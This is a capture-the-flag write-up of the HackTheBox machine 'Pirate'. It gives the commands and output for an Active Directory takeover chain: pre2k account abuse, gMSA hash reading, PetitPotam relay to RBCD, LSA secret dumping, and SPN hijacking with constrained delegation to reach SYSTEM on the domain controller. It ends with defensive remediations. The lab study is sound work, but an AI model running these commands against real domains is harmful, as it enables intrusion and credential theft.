---
title: Pirate
os: Windows
difficulty: Hard
tags:
  - Active Directory
  - Pre2k
  - gMSA
  - PetitPotam
  - RBCD
  - Constrained Delegation
  - SPN Hijacking
  - Privilege Escalation
---

# 🛡️ HTB - Pirate (Hard)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge" alt="Hard Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Pirate
- **Operating System:** Windows Server 2019
- **Difficulty:** Hard
- **Vulnerabilities:** Pre-Windows 2000 Compatibility Group Abuse, gMSA Password Read Delegation, PetitPotam Coercion to LDAPS, Constrained Delegation with Protocol Transition & SPN Hijacking

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.6.225
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-01 14:24 UTC
Nmap scan report for 10.129.6.225
Host is up (0.25s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-01 21:23:36Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
443/tcp  open  https?
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
```

- 🔍 *This is a Windows Active Directory Domain Controller (`pirate.htb`). We have been provided initial entry credentials:* `pentest / p3nt3st2025!&`
- 🔍 *Verifying the credentials via SMB using NetExec:*

```bash
nxc smb 10.129.6.225 -u 'pentest' -p 'p3nt3st2025!&'
```

```text
SMB         10.129.6.225    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb)
SMB         10.129.6.225    445    DC01             [+] pirate.htb\pentest:p3nt3st2025!&
```

- 🔍 *Listing domain user accounts:*

```bash
nxc smb 10.129.7.251 -u 'pentest' -p 'p3nt3st2025!&' --users
```

```text
SMB         10.129.7.251    445    DC01             a.white_adm                   2026-01-16 00:36:34 0           
SMB         10.129.7.251    445    DC01             a.white                       2025-06-08 19:33:01 0           
SMB         10.129.7.251    445    DC01             pentest                       2025-06-09 13:40:23 0           
SMB         10.129.7.251    445    DC01             j.sparrow                     2025-06-09 15:08:44 0           
```

---

## Step 2 - Enumeration

- 🔍 *Checking BloodHound, we notice that `Domain Users` belongs to the `Pre-Windows 2000 Compatible Access` group. This group allows querying attributes of computer accounts.*
- 🔍 *We search for pre-created computer accounts that do not have their passwords changed (Pre2k accounts) using NetExec:*

```bash
nxc ldap pirate.htb -u 'pentest' -p 'p3nt3st2025!&' -M pre2k
```

```text
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: MS01$
PRE2K       10.129.11.99    389    DC01             Pre-created computer account: EXCH01$
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for ms01@pirate.htb
PRE2K       10.129.11.99    389    DC01             [+] Successfully obtained TGT for exch01@pirate.htb
```

- 🔍 *We successfully retrieve Kerberos TGTs for computer accounts `MS01$` and `EXCH01$`.*
- 🔍 *Looking at delegation paths in BloodHound, `MS01$` belongs to the `Domain Secure Servers` group, which has permissions to read Group Managed Service Account (gMSA) passwords:*
  `MS01$ --(MemberOf)--> Domain Secure Servers --(ReadGMSA)--> gMSA_ADFS_prod$`
- 🔍 *We query the LDAP server to read the gMSA password hashes using our `MS01$` TGT context:*

```bash
nxc ldap pirate.htb -u 'MS01$' -p 'ms01' --gmsa -k
```

```text
LDAP        pirate.htb      389    DC01             [*] Getting GMSA Passwords
LDAP        pirate.htb      389    DC01             Account: gMSA_ADCS_prod$      NTLM: 304106f739822ea2ad8ebe23f802d078     
LDAP        pirate.htb      389    DC01             Account: gMSA_ADFS_prod$      NTLM: 8126756fb2e69697bfcb04816e685839     
```

- 🔍 *We retrieve the NTLM hash for `gMSA_ADFS_prod$`: `8126756fb2e69697bfcb04816e685839`.*

---

## Step 3 - Initial Foothold

- 🔍 *Logging into the target host via WinRM using the ADFS gMSA account hash:*

```bash
evil-winrm -i pirate.htb -u 'gMSA_ADFS_prod$' -H 8126756fb2e69697bfcb04816e685839
```

```text
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> whoami
pirate\gmsa_adfs_prod$
```

- 🔍 *Inspecting network interfaces, we find an internal adapter:*

```text
Ethernet adapter vEthernet (Switch01):
   IPv4 Address. . . . . . . . . . . : 192.168.100.1
```

- 🔍 *Scanning the internal subnet using `fscan.exe`:*

```text
*Evil-WinRM* PS C:\temp> .\fscan.exe -h 192.168.100.1/24 -nobr -nopoc
(icmp) Target 192.168.100.2   is alive
192.168.100.2:80 open
192.168.100.2:445 open
[->]WEB01
```

- 🔍 *We identify an internal web server `WEB01` (192.168.100.2).*
- 🔍 *We set up a Chisel proxy tunnel and scan for coercion vectors:*

```bash
proxychains nxc smb WEB01.pirate.htb \
    -u 'gMSA_ADFS_prod$' -H '8126756fb2e69697bfcb04816e685839' \
    -M coerce_plus
```

- 🔍 *`WEB01` is vulnerable to MS-EFSR (PetitPotam). We coerce authentication from `WEB01$` to our attacker machine running Responder, relaying it to `DC01` LDAPS to configure Resource-Based Constrained Delegation (RBCD).*
- 🔍 *We configure `WEB01$` to trust `gMSA_ADFS_prod$` for delegation, request a ticket, and log in to `WEB01` as Administrator:*

```bash
proxychains evil-winrm -i WEB01.pirate.htb -u 'administrator' -H b1aac1584c2ea8ed0a9429684e4fc3e5
```

- 🔍 *Dumping LSA secrets on `WEB01` to retrieve cached credentials for local users:*

```text
_SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_a09ca32bc7cd2ce752ae0143bd203f0551564c04dd2846c4ed3e4e5a61cc9f11
a.white:E2nvAOKSz5Xz2MJu
```

- 🔍 *We obtain credentials for `a.white`: `E2nvAOKSz5Xz2MJu`. We read the user flag from `C:\Users\a.white\Desktop\user.txt`.*

---

## Step 4 - Privilege Escalation

- 🔍 *Checking BloodHound, we discover the delegation path to Domain Admin:*
  `a.white --(ForceChangePassword)--> a.white_adm --(WriteSPN)--> DC01$`
- 🔍 *`a.white_adm` belongs to the `IT@Pirate.htb` group which has `WriteSPN` privileges over the primary Domain Controller (`DC01`).*
- 🔍 *First, we force reset the password of `a.white_adm` using `bloodyAD`:*

```bash
bloodyAD --host DC01.pirate.htb -d pirate.htb \
    -u a.white -p E2nvAOKSz5Xz2MJu \
    set password \
    'a.white_adm' 'FluXionP@ssw0rd'
```

- 🔍 *Checking delegation parameters for `a.white_adm`:*

```bash
nxc ldap dc01.pirate.htb -u 'a.white_adm' -p 'FluXionP@ssw0rd' --find-delegation
```

```text
AccountName   AccountType  DelegationType                     DelegationRightsTo       
-----------   -----------  ------------------                 ------------------       
a.white_adm   Person       Constrained w/ Protocol Transition http/WEB01.pirate.htb
```

> [!IMPORTANT]
> **Constrained Delegation w/ Protocol Transition & SPN Hijacking:**
> The `a.white_adm` account has Constrained Delegation with Protocol Transition configured to access the `http/WEB01.pirate.htb` service principal name (SPN). Because `a.white_adm` has `WriteSPN` privileges on `DC01$`, we can strip the HTTP SPN from `WEB01` and assign it to `DC01$`.
> 
> The KDC will then trust `a.white_adm` to perform S4U2Self/S4U2Proxy requests, allowing us to impersonate `Administrator` to access `http/WEB01.pirate.htb` (now pointing to `DC01$`). By requesting the ticket and changing the service type to `CIFS/DC01.pirate.htb` locally (via ticket manipulation), we can log in as System on the DC.

- 🔍 *First, we delete the HTTP SPN from the `WEB01` object:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'FluXionP@ssw0rd' \
    msldap delspn \
    "CN=WEB01,CN=Computers,DC=pirate,DC=htb" \
    "HTTP/WEB01.pirate.htb"
```

- 🔍 *Next, we assign the `HTTP/WEB01.pirate.htb` SPN to the Domain Controller `DC01`:*

```bash
bloodyAD -H DC01.pirate.htb -d pirate.htb \
    -u a.white_adm -p 'FluXionP@ssw0rd' \
    msldap addspn \
    "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb" \
    "HTTP/WEB01.pirate.htb"
```

- 🔍 *Using `getST.py` to run the S4U2Self/S4U2Proxy sequence, requesting a ticket for the Administrator and converting the service to `CIFS`:*

```bash
getST.py PIRATE.HTB/a.white_adm:'FluXionP@ssw0rd' \
    -spn HTTP/WEB01.pirate.htb \
    -impersonate Administrator \
    -dc-ip DC01.pirate.htb \
    -altservice CIFS/DC01.pirate.htb
```

```text
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

- 🔍 *We load the ticket context and establish a system shell on `DC01` using `psexec`:*

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
psexec.py -k -no-pass DC01.pirate.htb
```

```text
C:\Windows\system32> whoami
nt authority\system
```

- 🔍 *Root access achieved. The root flag is read from `c:\users\administrator\desktop\root.txt`.*

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Enterprise Active Directory Assessment**
> Below is the post-exploitation blueprint analyzing every vulnerability and administrative configuration issue exploited in the Pirate lab. Each identified weakness is mapped to its core risk, threat context, and practical defensive remediation strategies.

### 🔴 Pre-Windows 2000 Compatible Access Abuse

> [!WARNING]
> **Vulnerability Profile:**
> The `Domain Users` group is a member of the legacy `Pre-Windows 2000 Compatible Access` group, allowing unprivileged accounts to query computer object attributes.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers can identify computer accounts that were pre-created but never logged in (pre2k accounts) and request Kerberos tickets on their behalf, gaining access to the computer's service rights in the domain.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Remove `Domain Users` and `Authenticated Users` from the `Pre-Windows 2000 Compatible Access` group.
> - **Remediation:** Periodically delete or disable legacy, stale, or unused pre-created computer accounts.
> - **Detection:** Audit Active Directory for computer objects where the password has never been rotated or matches default hashes.

---

### 🔴 Permissive writeSPN Permissions on Domain Controllers

> [!WARNING]
> **Vulnerability Profile:**
> Delegated non-admin groups (`IT@Pirate.htb`) possess `WriteSPN` (write servicePrincipalName) permissions over Domain Controller objects.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Attackers with `WriteSPN` rights can hijack SPNs assigned to other hosts and map them to Domain Controllers. By chaining this with constrained delegation (with protocol transition), attackers can request administrative Kerberos tickets and modify the target service to CIFS, gaining SYSTEM shells on the Domain Controllers.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Strictly restrict `WriteSPN` permissions over domain controllers to only Domain Admins.
> - **Remediation:** Mark sensitive accounts (like Domain Administrators) as "Account is sensitive and cannot be delegated" in Active Directory to prevent constrained delegation delegation.
> - **Detection:** Monitor Event ID 5136 targeting changes to the `servicePrincipalName` attribute on Domain Controllers.

---

### 🔴 Excessively Broad gMSA Password Read Permissions

> [!WARNING]
> **Vulnerability Profile:**
> Group Managed Service Account (gMSA) password read rights (`readGMSA`) are granted to broad groups (e.g. `Domain Secure Servers`) containing compromised computer accounts.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> If any computer belonging to the allowed read group is compromised, the attacker can extract the gMSA password hash and immediately authenticate as the service account across the domain.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Enforce the principle of least privilege: assign `PrincipalsAllowedToReadPassword` on gMSAs exclusively to the specific computer objects executing the service, rather than broad group containers.
> - **Detection:** Audit gMSA delegation paths periodically to ensure only authorized endpoints can retrieve password structures.
